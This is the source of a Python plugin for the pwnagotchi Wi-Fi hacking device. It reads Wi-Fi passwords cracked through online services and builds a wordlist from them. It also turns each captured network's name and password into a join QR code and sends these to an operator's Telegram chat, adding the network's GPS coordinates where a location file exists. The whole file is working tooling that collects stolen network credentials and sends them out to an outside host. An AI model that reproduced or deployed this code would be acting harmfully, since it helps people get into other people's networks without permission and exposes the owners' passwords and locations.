#takes cracked hashes, makes qr codes and a wordlist, and will send qrcode, and send the login info also
#the location if possible all to your telegram. potfile processing and the idea to use qr codes taken from mycracked_pw and the idea to use telegram from WPA2s telegram plugin
from math import log
import pwnagotchi, logging, qrcode, json, html, csv, os, io, glob, telegram, time, subprocess
import pwnagotchi.plugins as plugins#unneeded button stuff
from pwnagotchi import config
from PIL import Image

class qt(plugins.Plugin):
    __author__ = 'NeonLightning'
    __version__ = '0.3.1'
    __license__ = 'GPL3'
    __description__ = 'takes cracked info and sends it over telegram with qr codes and location'
            
    def on_loaded(self):
        self.qrcode_dir = '/home/pi/qrcodes/'
        self.bot_token = config['main']['plugins']['qt']['bot_token']
        self.chat_id = config['main']['plugins']['qt']['chat_id']
        self.cracked = "/home/pi/wordlists/cracked.txt"
        self.bot = telegram.Bot(token=self.bot_token)
        self.last_files = set()
        self.all_bssid=[]
        self.all_ssid=[]
        self.all_passwd=[]
        self.loaded = True
        logging.info(f"[qt] loaded")
        
    def on_unloaded(self):
        logging.info("[qt] unloaded")
        return
        
    def _read_wpa_sec_file(self):
        wpa_sec_filepath = '/root/handshakes/wpa-sec.cracked.potfile'
        try:
            with open(wpa_sec_filepath, 'r+', encoding='utf-8') as f:
                for line_f in f:
                    pwd_f = line_f.split(':')
                    self.all_passwd.append(str(pwd_f[-1].rstrip('\n')))
                    self.all_bssid.append(str(pwd_f[0]))
                    self.all_ssid.append(str(pwd_f[-2]))
        except:
            logging.error('[qt] encountered a problem in wpa-sec.cracked.potfile')

    def _read_onlinehashcrack_file(self):
        onlinehashcrack_filepath = '/root/handshakes/onlinehashcrack.cracked'
        try:
            with open(onlinehashcrack_filepath, 'r+', encoding='utf-8') as h:
                for line_h in csv.DictReader(h):
                    pwd_h = str(line_h['password'])
                    bssid_h = str(line_h['BSSID'])
                    ssid_h = str(line_h['ESSID'])
                    if pwd_h and bssid_h and ssid_h:
                        self.all_passwd.append(pwd_h)
                        self.all_bssid.append(bssid_h)
                        self.all_ssid.append(ssid_h)
                h.close()
        except Exception as e:
            logging.error(f"[qt] Encountered a problem in onlinehashcrack.cracked: {str(e)}")

    def _generate_qr_code(self, bssid, ssid, password):
        if not os.path.exists('/home/pi/qrcodes/'):
            os.makedirs('/home/pi/qrcodes/')
            self.qrcode_dir = '/home/pi/qrcodes/'
        png_filepath = os.path.join("/home/pi/qrcodes/", f"{ssid}-{password}-{bssid.lower().replace(':', '')}.png")
        filename = f"{ssid}-{password}-{bssid.lower().replace(':', '')}.png"
        if os.path.exists(png_filepath):
            return
        qrlist_path = "/home/pi/.qrlist"
        if os.path.exists(qrlist_path):
            with open(qrlist_path, 'r') as qrlist_file:
                qrlist = qrlist_file.read().splitlines()
                if filename in qrlist:
                    return
        qr_data = f"WIFI:T:WPA;S:{html.escape(ssid)};P:{html.escape(password)};;"
        qr_code = qrcode.QRCode(
            version=None,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr_code.add_data(qr_data)
        qr_code.make(fit=True)
        try:
            qrlist_filepath = "/home/pi/.qrlist"
            if os.path.exists(qrlist_filepath):
                with open(qrlist_filepath, 'r') as qrlist_file:
                    qrlist = qrlist_file.read().splitlines()
                    if png_filepath in qrlist:
                        return
            else:
                open(qrlist_filepath, 'w+').close()
            img = qr_code.make_image(fill_color="yellow", back_color="black")
            img.save(png_filepath)
            logging.info(f"[qt] generated and saved for {ssid}-{password}-{bssid.lower().replace(':', '')}")
        except Exception as e:
            logging.error(f"[qt] something went wrong generating QR code for {ssid}-{password}-{bssid.lower().replace(':', '')}: {e}")
    
    def _add_password_to_file(self, password):
        with open(self.cracked, 'a+') as passwords_file:
            passwords_file.seek(0)
            passwords = passwords_file.read().splitlines()
            if password not in passwords:
                passwords_file.write(password + '\n')

    def _update_all(self):
        self._read_wpa_sec_file()
        self._read_onlinehashcrack_file()
        for bssid, ssid, password in zip(self.all_bssid, self.all_ssid, self.all_passwd):
            self._add_password_to_file(password)
            self._generate_qr_code(bssid, ssid, password)

    def on_internet_available(self, agent):
        self._update_all()
        self._send_qr_codes()
        
    def on_handshake(self, agent):
        self._update_all()

    def send_qrcode_file(self, filename):
        qrlist_path = "/home/pi/.qrlist"
        if os.path.exists(qrlist_path):
            with open(qrlist_path, 'r') as qrlist_file:
                qrlist = qrlist_file.read().splitlines()
                if filename in qrlist:
                    return
        ssid_n_pass = filename.rsplit('-', 1)[-2]
        bssid = filename.rsplit('-', 1)[-1].rsplit('.', 1)[0].lower().replace(':', '')
        geojson_files = glob.glob(f"/root/handshakes/*_{bssid}.geo.json")
        if geojson_files:
            with open(f"/home/pi/qrcodes/{filename}", 'rb') as f, open(geojson_files[0], 'r') as f_geojson:
                data = json.load(f_geojson)
                lat = data['location']['lat']
                lng = data['location']['lng']
                caption = f"^^^ {ssid_n_pass} Lat: {lat}, Lng: {lng}"
                self.bot.send_photo(self.chat_id, f, caption)
                time.sleep(1)
        else:
            with open(f"/home/pi/qrcodes/{filename}", 'rb') as f:
                caption = f"^^^ {ssid_n_pass}"
                self.bot.send_photo(self.chat_id, f, caption)
                time.sleep(1)
        with open(qrlist_path, 'a') as qrlist_file:
            qrlist_file.write(filename + '\n')

    def _send_qr_codes(self):
        dir_path = "/home/pi/qrcodes"
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)
        qrlist_path = "/home/pi/.qrlist"
        if not os.path.exists(qrlist_path):
            open(qrlist_path, 'a+').close()
        sent_files = set()
        with open(qrlist_path, 'r') as f:
            content = f.read().strip()
            if content:
                sent_files = set(content.split('\n'))
        current_files = set(f for f in os.listdir('/home/pi/qrcodes') if f.endswith('.png'))
        new_files = current_files - sent_files
        if new_files:
            self._update_all()
            for filename in new_files:
                if filename not in sent_files:
                    logging.info("[qt] sent file: " + filename)
                    self.send_qrcode_file(filename)
                    sent_files.add(filename)
                sent_files_list = list(sent_files)
            with open(qrlist_path, 'w') as f:
                f.write('\n'.join(sent_files))